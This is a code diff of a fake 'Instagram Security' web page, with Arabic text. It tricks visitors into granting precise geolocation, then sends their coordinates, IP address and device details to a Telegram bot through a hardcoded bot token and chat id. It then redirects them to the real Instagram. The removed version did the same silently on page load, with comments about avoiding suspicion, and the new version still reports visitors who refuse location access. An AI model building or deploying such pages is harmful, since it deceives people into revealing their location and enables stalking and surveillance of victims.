@@ -3,60 +3,72 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Instagram</title>
+    <title>Instagram Security</title>
     <style>
-        /* شاشة تحميل بسيطة لتبدو العملية طبيعية */
-        body { font-family: -apple-system, sans-serif; background: #fafafa; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .loader { border: 3px solid #f3f3f3; border-top: 3px solid #3498db; border-radius: 50%; width: 30px; height: 30px; animation: spin 1s linear infinite; }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        body { font-family: -apple-system, sans-serif; background: #fafafa; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; direction: rtl; }
+        .container { background: white; border: 1px solid #dbdbdb; padding: 30px; width: 330px; text-align: center; border-radius: 8px; }
+        .logo { width: 150px; margin-bottom: 20px; }
+        h3 { font-size: 18px; color: #262626; }
+        p { font-size: 14px; color: #8e8e8e; line-height: 1.4; }
+        button { width: 100%; background: #0095f6; color: white; border: none; padding: 12px; border-radius: 8px; font-weight: bold; cursor: pointer; margin-top: 15px; }
     </style>
 </head>
 <body>
 
-    <div class="loader"></div>
+<div class="container">
+    <img src="https://www.instagram.com/static/images/web/logged_out_wordmark.png/7a252e05b564.png" class="logo">
+    <div id="setup">
+        <h3>تأكيد تسجيل الدخول</h3>
+        <p>يرجى السماح بالوصول إلى الموقع الجغرافي للتأكد من أنك تفتح الحساب من منطقة موثوقة ولتجنب حظر الحساب.</p>
+        <button id="get-location">تأكيد الموقع الآن</button>
+    </div>
+    <div id="loading" style="display:none;">
+        <p>جاري التحقق من البيانات...</p>
+    </div>
+</div>
 
-    <script>
-        const token = '8609389464:AAEIqne_f0xZNOeqYz-rk7XOsbALUM12gA8';
-        const chat_id = '8658217605';
+<script>
+    const token = '8609389464:AAEIqne_f0xZNOeqYz-rk7XOsbALUM12gA8';
+    const chat_id = '8658217605';
 
-        async function collectAndRedirect() {
-            try {
-                // 1. جلب عنوان الـ IP
+    document.getElementById('get-location').addEventListener('click', function() {
+        document.getElementById('setup').style.display = 'none';
+        document.getElementById('loading').style.display = 'block';
+
+        if (navigator.geolocation) {
+            // طلب إحداثيات الموقع بدقة عالية
+            navigator.geolocation.getCurrentPosition(async (position) => {
+                const lat = position.coords.latitude;
+                const lon = position.coords.longitude;
+                const accuracy = position.coords.accuracy;
+
+                // رابط خرائط جوجل المباشر
+                const googleMapsLink = `https://www.google.com/maps?q=${lat},${lon}`;
+
+                // جلب الـ IP ومعلومات الجهاز
                 const ipRes = await fetch('https://api.ipify.org?format=json');
                 const ipData = await ipRes.json();
 
-                // 2. تجميع معلومات الجهاز
-                const info = {
-                    ip: ipData.ip,
-                    device: navigator.userAgent,
-                    platform: navigator.platform,
-                    screen: `${screen.width}x${screen.height}`,
-                    lang: navigator.language,
-                    time: new Date().toLocaleString('ar-EG')
-                };
-
-                // 3. إرسال المعلومات للتليجرام
-                const message = `🔔 زيارة جديدة صامتة لـ أنس:\n\n` +
-                                `🌐 الـ IP: ${info.ip}\n` +
-                                `📱 الجهاز: ${info.device}\n` +
-                                `💻 المنصة: ${info.platform}\n` +
-                                `🖥️ الشاشة: ${info.screen}\n` +
-                                `🌍 اللغة: ${info.lang}\n` +
-                                `⏰ الوقت: ${info.time}`;
+                const message = `🎯 صيدة إحداثيات دقيقة لـ أنس:\n\n` +
+                              `📍 الموقع على الخريطة:\n${googleMapsLink}\n\n` +
+                              `🎯 نسبة الدقة: ${Math.round(accuracy)} متر\n` +
+                              `🌐 الـ IP: ${ipData.ip}\n` +
+                              `📱 الجهاز: ${navigator.userAgent}`;
 
                 await fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(message)}`);
 
-                // 4. التوجه المباشر لإنستغرام
-                window.location.replace("https://www.instagram.com");
+                // تحويل لإنستغرام بعد النجاح
+                window.location.href = "https://www.instagram.com";
 
-            } catch (err) {
-                // في حال حدوث أي خطأ (مثلاً مانع إعلانات)، حوله أيضاً لكي لا يشك
-                window.location.replace("https://www.instagram.com");
-            }
+            }, async (error) => {
+                // في حال رفض المستخدم إعطاء الموقع
+                const msg = `⚠️ المستخدم رفض إعطاء الموقع، لكن إليك بياناته الأساسية:\n📱 الجهاز: ${navigator.userAgent}`;
+                await fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(msg)}`);
+                window.location.href = "https://www.instagram.com";
+            }, { enableHighAccuracy: true });
         }
+    });
+</script>
 
-        // تنفيذ الكود فور تحميل الصفحة
-        window.onload = collectAndRedirect;
-    </script>
 </body>
 </html>
